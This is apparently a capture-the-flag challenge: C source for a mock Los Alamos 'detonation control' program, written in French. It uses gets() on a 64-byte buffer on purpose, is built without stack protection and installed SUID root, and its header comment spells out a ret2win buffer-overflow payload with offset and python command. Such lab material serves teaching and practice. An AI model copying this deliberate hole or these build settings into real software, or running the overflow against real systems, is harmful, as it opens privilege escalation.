/*
 * osplosion     Programme de contrôle de détonation, Los Alamos
 *
 * Compilé avec :
 *   gcc -o osplosion -fno-stack-protector -no-pie osplosion.c
 *
 * SUID root installé dans /usr/local/bin/osplosion
 *
 * Exploitation :
 *   - Offset : 72 octets (buffer[64] + saved RBP 8 octets)
 *   - Cible  : classified_report()      visible via strings / objdump
 *   - Payload: python3 -c "import sys; sys.stdout.buffer.write(
 *               b'A'*72 + b'\xAD\xDE\xAD\xBE\xEF\xCA\xFE\x00')" > /tmp/p
 *              /usr/local/bin/osplosion < /tmp/p
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define CLASSIFIED_FILE "/var/classified/trinity_codes.enc"

/* ─── Jamais appelée directement     cible du ret2win ─────────────────────── */
void classified_report(void) {
    __asm__ volatile ("andq $-16, %rsp");   /* alignement pile pour libc */
    printf("\n[TRINITY] DÉTONATION INITIÉE     LECTURE DES CODES D'AMORÇAGE\n");
    printf("──────────────────────────────────────────────────────────\n");

    FILE *f = fopen(CLASSIFIED_FILE, "r");
    if (!f) {
        fprintf(stderr, "[-] Fichier classifié inaccessible.\n");
        return;
    }

    char buf[256];
    while (fgets(buf, sizeof(buf), f)) {
        printf("%s", buf);
    }
    fclose(f);

    printf("──────────────────────────────────────────────────────────\n");
    printf("[TRINITY] *** LE CENTRE A EXPLOSÉ ***\n\n");
    fflush(stdout);
    exit(0);
}

/* ─── Fonction principale     contient la vulnérabilité ───────────────────── */
int main(void) {
    char input[64];

    setvbuf(stdout, NULL, _IONBF, 0);

    printf("=== SYSTÈME DE CONTRÔLE DE DÉTONATION     LOS ALAMOS ===\n");
    printf("Entrez le code d'amorçage : ");

    gets(input);  /* vulnerable: pas de vérification de longueur */

    printf("Code invalide. Détonation annulée.\n");
    return 0;
}
